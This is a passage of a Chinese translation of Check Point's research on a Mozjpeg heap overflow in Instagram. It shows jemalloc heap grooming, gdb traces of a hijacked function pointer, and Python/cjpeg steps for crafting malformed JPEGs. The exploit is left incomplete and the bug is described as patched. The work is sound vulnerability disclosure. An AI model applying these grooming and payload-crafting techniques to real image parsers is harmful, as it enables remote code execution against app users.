+image”分配的，并由`jpeg_finish_decompress`或`jpeg_abort`释放。这意味着所有free操作都在解压缩过程结束时使用`jpeg_finish_decompress`或`jpeg_abort`进行，只有在完成使用Wildcopy循环的覆盖内存后，才会调用该操作。
+
+但是，在我们的例子中，我们不需要任何free操作，因为我们可以控制一个函数，该函数最终会执行内存分配大小受我们控制的malloc函数。这使我们能够选择将可溢出的缓冲区放在堆上的位置。
+
+我们想将可以溢出的缓冲区对象放置在执行函数指针调用的`main/post/coef`大型(0x5000)数据结构对象之前。
+
+![](https://p3.ssl.qhimg.com/t0198cefda293852591.png)
+
+因此，我们利用此漏洞的最简单方法是对堆进行布局，以便将溢出的缓冲区分配到我们的目标（0x5000byte）对象之前，然后（使用该错误）覆盖`main/post/coef`虚函数地址。这使我们可以完全控制虚表，将任意方法重定向到指定的地址。
+
+我们知道目标对象具有相同的大小(0x5000)，并且因为`Jemalloc`从顶到底分配空间，所以我们唯一需要做的就是将溢出对象放在目标块所在的底部。
+
+在我们测试的Android版本中，`Jemalloc`的块大小为2MB。
+
+对象之间的距离（以字节为单位）并不重要，因为我们有一个wildcopy循环，可以逐行复制大量数据（我们控制行的大小）。被复制的数据最终大于2MB，因此我们可以确定，最终我们将破坏溢出对象之后的块中的每个对象。
+
+由于我们无法控制free操作，因此无法创建对象会掉进去的洞。
+（洞是run过程中一个或多个被free的位置。）相反，我们尝试查找在图像解压缩流程中无论如何都会出现的洞，并寻找在调试期间反复出现的大小。
+
+让我们使用shadow工具检查块在内存中的布局：
+
+    
+    
+    (gdb) jechunk 0x72a6200000
+    This chunk belongs to the arena at 0x72c808fc00.
+    addr            info                  size       usage  
+    ------------------------------------------------------------    0x72a6200000    headers               0xd000     -      
+    0x72a620d000    large run             0x1b000    -            
+    0x72a6227000    large run             0x1b000    -      
+    0x72a6228000    small run (0x180)     0x3000     10/32  
+    0x72a622b000    small run (0x200)     0x1000     8/8    
+    ...
+    ...
+    0x72a638f000    small run (0x80)      0x1000     6/32   
+    0x72a6390000    small run (0x60)      0x3000     12/128 
+    0x72a6393000    small run (0xc00)     0x3000     4/4    
+    0x72a6396000    small run (0xc00)     0x3000     4/4    
+    0x72a6399000    small run (0x200)     0x1000     2/8    
+    0x72a639a000    small run (0xe0)      0x7000     6/128  <===== The run we want to hit!!!
+    0x72a63a1000    small run (0x1000)    0x1000     1/1    
+    0x72a63a2000    small run (0x1000)    0x1000     1/1    
+    0x72a63a3000    small run (0x1000)    0x1000     1/1    
+    0x72a63a4000    small run (0x1000)    0x1000     1/1    
+    0x72a63a5000    large run    0x5000        -         <===== Large targeted object!!!
+    
+
+我们正在寻找带有洞的`runs`，并且这些`runs`必须在要覆盖的较大目标缓冲区之前。 run可用于托管一个大块的或多个小型/中型的分配操作。
+
+承载小分配的runs被分为区域(regions)。一个区域(regions)等同于一个小的分配。 每个小的runs仅容纳一个区域(regions)。
+换句话说，一个小runs恰好与一个区域(regions)大小相关联。
+
+托管中型分配的runs也被划分为多个区域，但顾名思义，它们大于小型分配。 因此，托管介质分配的runs被划分为占用更多空间的类区域。
+
+例如，将一个大小为0xe0的小`run`分成128个区域(regions)：
+
+    
+    
+    0x72a639a000    small run (0xe0)      0x7000     6/128
+    
+
+大小为0x200的中型run被分为8个区域：
+
+    
+    
+    0x72a6399000    small run (0x200)     0x1000     2/8
+    
+
+小块分配是最常见的，很可能是我们需要`manipulate/control/overflow`的分配。
+由于将较小的分配划分为更多的区域(regions)，因此它们更易于控制，因为由其他线程来分配其余区域(regions)的可能性较小。
+
+因此，为了使可溢出对象分配到大型目标对象之前，我们使用我们的Python脚本（wild copy利用）。
+该脚本可帮助我们生成需要的图片尺寸，这将使得malloc在目标的小型类中分配可溢出对象。
+
+我们构造了一个新的JPEG图像，其大小（0xe0）将会触发分配给对象的小型类，并在`libjepgutils_moz.so +
+0x918`上设置了一个断点。
+
+    
+    
+    (gdb) x/20i $pc
+    => 0x7e47ead7dc:    bl    0x7e47eae660 <__wrap_malloc@plt>
+       0x7e47ead7e0:    mov    x23, x0
+    
+
+我们在可控的malloc之前只有一条命令，X0寄存器刚好拥有我们希望分配的大小：
+
+    
+    
+    (gdb) info registers x0
+    x0             0xe0        224
+    
+
+我们继续执行一个命令，然后再次检查X0寄存器，该寄存器现在保存了调用malloc后返回的结果：
+
+    
+    
+    (gdb) x/20i $pc
+    => 0x7e4cf987e0:    mov    x23, x0
+    
+    (gdb) info registers x0
+    x0             0x72a639ac40    492415069248
+    
+
+我们从malloc获取的地址是我们可溢出对象的地址(0x72a639ac40)。 让我们使用shadow框架中的`jeinfo`方法检查其在堆上的位置。
+
+    
+    
+    (gdb) jechunk 0x72a6200000
+    This chunk belongs to the arena at 0x72c808fc00.
+    …
+    ...
+    0x72a639a000    small run (0xe0)      0x7000     7/128  <-----hit!!!
+    0x72a63a1000    small run (0x1000)    0x1000     1/1    
+    0x72a63a2000    small run (0x1000)    0x1000     1/1    
+    0x72a63a3000    small run (0x1000)    0x1000     1/1    
+    0x72a63a4000    small run (0x1000)    0x1000     1/1    
+    0x72a63a5000    large run             0x5000     -     <------Large targeted object!!!
+    
+
+让我们继续执行，看看覆盖大型目标对象后会发生什么
+
+    
+    
+    (gdb) c
+    Continuing.
+    [New Thread 29767.30462]
+    
+    Thread 93 "IgExecutor #19" received signal SIGBUS, Bus error.
+    0xff9d9588ff989083 in ?? ()
+    
+
+BOOM! 正是我们的目标–当程序试图通过函数指针从溢出的对象中加载被传入数据破坏的函数地址时，崩溃发生了。
+我们遇到了总线错误（也称为SIGBUS，通常为信号10），该错误在进程尝试访问CPU无法物理寻址的内存时发生。
+换句话说，程序尝试访问的内存不是有效的内存地址，因为它包含来自我们映像的数据，该数据替换了实函数指针并导致崩溃！
+
+## 把所有东西放在一起
+
+我们有一个可控的函数调用。 编写一个可靠的漏洞利用所缺少的就是将可执行内存重定向到一个方便的堆栈块构建ROP。
+
+现在我们需要将所有内容放在一起:
+
+>   1. 构造大小畸形的图像
+>   2. 触发错误
+>   3. 生成我们控制的有效payload的副本
+>   4. 将执行跳转到受我们控制的地址。
+>
+
+我们需要使用受控数据来生成损坏的JPEG。 因此，我们的下一步是确切确定Mozjpeg平台支持哪些图像格式。 我们可以从下面的代码中找出答案。
+`out_color_space`表示根据图像格式确定的每个像素的位数。
+
+    
+    
+    switch (cinfo->out_color_space) {
+      case JCS_GRAYSCALE:
+        cinfo->out_color_components = 1;
+        Break;
+      case JCS_RGB:
+      case JCS_EXT_RGB:
+      case JCS_EXT_RGBX:
+      case JCS_EXT_BGR:
+      case JCS_EXT_BGRX:
+      case JCS_EXT_XBGR:
+      case JCS_EXT_XRGB:
+      case JCS_EXT_RGBA:
+      case JCS_EXT_BGRA: 
+      case JCS_EXT_ABGR: 
+      case JCS_EXT_ARGB:
+        cinfo->out_color_components = rgb_pixelsize[cinfo->out_color_space];
+        Break;
+      case JCS_YCbCr:
+      case JCS_RGB565:
+          cinfo->out_color_components = 3; 
+          break; 
+      case JCS_CMYK:
+      case JCS_YCCK:
+          cinfo->out_color_components = 4;
+          break;
+      default:                      
+        cinfo->out_color_components = cinfo->num_components;
+        Break;
+    
+
+我们使用了一个称为[PIL](https://imageio.readthedocs.io/en/stable/format_jpeg-pil.html)的简单Python库来构造RGB BMP文件。 我们选择了我们熟悉的RGB格式，并在其中填充了“ AAA”作为有效载荷。
+该文件是我们用来创建恶意压缩JPEG的基本图像格式。
+
+    
+    
+    from PIL import Image
+     img = Image.new('RGB', (100, 100)) 
+    pixels = img.load() 
+    for i in range(img.size[0]):  
+        for j in range(img.size[1]):
+            pixels[i,j] = (0x41, 0x41, 0x41) 
+    
+    img.save('rgb100.bmp')
+    
+
+然后，我们使用Mozjpeg项目中的cjpeg工具将bmp文件压缩为JPEG文件。
+
+    
+    
+    ./cjpeg -rgb -quality 100 -fastcrush -notrellis -notrellis-dc -noovershoot -outfile rgb100.jpg rgb100.bmp
+    
+
+接下来，我们测试了压缩后的输出文件以验证我们的假设。 我们知道RGB格式是每个像素3个字节。
+
+我们要验证代码是否正确设置了`cinfo-> out_color_space = 0x2(JCS_RGB)`。
+但是，当我们检查控制的分配时，我们看到作为整数溢出一部分的`height`和`width`参数仍然乘以值为4的`out_color_components`，纵然我们从RGB格式开始，每行使用`3x8-bit`像素。
+看来Mozjpeg更倾向于将我们的图像转换为每个像素`4x8-bit`的格式。
+
+然后，我们转向了Mozjpeg平台支持的`4x8-bit`像素格式，CMYK格式满足了标准。我们使用CMYK格式作为基本图像，以便完全控制所有4个字节。我们在图像中填充了“AAAA”作为有效载荷。
+
+我们将其压缩为JPEG格式，并添加了可以触发程序崩溃的图片尺寸。 令我们振奋的是，我们发生了以下崩溃！
+
+    
+    
+    Thread 93 "IgExecutor #19" received signal SIGBUS, Bus error.
+    0xff414141ff414141 in ?? ()
+    
+
+但是，即使我们在每个像素图像上构建了`4x8-bit`的图像，我们也还是得到了一个奇怪的`0xFF`字节在我们可控地址中，然而其却并非有效载荷的一部分。
+
+这个`0xFF`是什么意思？ 透明度！
+
+支持透明的位图文件格式包括GIF，PNG，BMP，TIFF和JPEG 2000（通过颜色透明或Alpha通道）。
+
+基于位图的图像在技术上是通过图像的宽度和高度（以像素为单位）以及每个像素的位数来表征的。
+
+因此，我们决定使用PIL库通过受控的alpha通道（0x61）构造RGBA BMP格式文件。
+
+    
+    
+    from PIL import Image
+     img = Image.new('RGBA', (100, 100))
+     pixels = img.load()
+     for i in range(img.size[0]):  
+         for j in range(img.size[1]):
+             pixels[i,j] = (0x41, 0x41, 0x41,0x61)
+     img.save('rgba100.bmp')
+    
+
+令人惊讶的是，我们得到的结果与使用CMYK构造的恶意JPEG触发崩溃的结果相同。
+即便我们使用了RGBA格式作为压缩JPEG的基础，我们仍然在可控的地址中看到了`0xFF`，并且文件中的Alpha通道的值为（0x61）。 这怎么发生的？
+让我们回到代码中，了解造成这种奇怪行为的原因。
+
+最终我们在下面的这段小代码中找到了答案：
+
+![](https://p3.ssl.qhimg.com/t014c805d08bf5bb09c.png)
+
+我们发现Instagram在`jpeg_read_header`完成之后并且在调用`jpeg_start_decompress`之前添加了自己的`const`值。
+
+我们使用了第一个测试中的RGB格式，并且看到Mozjpeg确实正确设置了`cinfo-> out_color_space = 0x2(JCS_RGB)`。
+但是，从Instagram的代码(图3)中，我们可以看到此值被表示为`(JCS_EXT_RGBA)`格式的const值`0xc`覆盖了。
+
+这也解释了为什么即使我们使用每个像素`3x8-bit`的RGB对象，也得到了奇怪的`0xFF` alpha通道。
+
+深入研究代码后，我们看到alpha通道（0xFF）的值被硬编码为const值。 当Instagram将`cinfo-> out_color_space =
+0xc`设置为指向`(JCS_EXT_RGBA)`格式时，代码从输入的基本文件中复制3个字节，然后复制的第4个字节始终是硬编码的alpha通道值。
+
+    
+    
+    #ifdef RGB_ALPHA
+          outptr[RGB_ALPHA] = 0xFF;
+    #endif
+    
+
+现在我们将所有内容放在一起，得出的结论是，无论将哪种图像格式用作压缩JPEG的基础，Instagram始终会将输出文件转换为RGBA格式文件。
+
+始终在开头添加`0xff`这一事实意味着我们可以在大端环境中实现我们的目标。
+
+小端系统将单词的最低有效字节存储在最小的存储地址中。 因为我们使用的是低位优先系统，所以Alpha通道值始终被改写为受控地址的最高有效字节。
+当我们尝试在用户模式下利用该错误，并且（0xFF）开头的地址值属于内核地址空间时，它会直接挫败我们的计划。
+
+## 可以利用吗
+
+我们失去了快速取得胜利的可能。 但可以从中学到的一课是，现实生活不是CTF游戏，有时开发人员设定的一个关键const值可能会从开发角度破坏一切。
+
+让我们回想一下Mozilla基金会主要网站上有关Mozjpeg的内容：
+
+**Mozjpeg的唯一目的是减少网络上提供的JPEG文件的大小。**
+
+据我们所知，每上传一张图片，Instagram就会增加25%的内存使用量!大约每天1亿美元!
+
+至此，Facebook已经修补了该漏洞，因此即使我们还没有完全解决它，我们也停止了利用开发工作。
+
+我们仍然只有3个字节的覆盖，从理论上讲，我们可以投入更多的时间来找到更多有用的原语，以帮助我们利用此错误。但是，我们认为我们已经做了足够的工作，并且已经宣传了我们想要传达的重要观点。
+
+本文翻译自research.checkpoint.com
+[原文链接](https://research.checkpoint.com/2020/instagram_rce-code-execution-vulnerability-in-instagram-app-for-android-and-ios/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Taolaw** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/219086](/post/id/219086)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自:
+[research.checkpoint.com](https://research.checkpoint.com/2020/instagram_rce-code-execution-vulnerability-in-instagram-app-for-android-and-ios/)
+
+如若转载,请注明出处： <https://research.checkpoint.com/2020/instagram_rce-code-execution-vulnerability-in-instagram-app-for-android-and-ios/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [移动安全](/tag/移动安全)
+
+ **+1** __4赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/g?b=oidb&k=iabfet9npibuxMOzm8GVjicEg&s=40) Taolaw
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
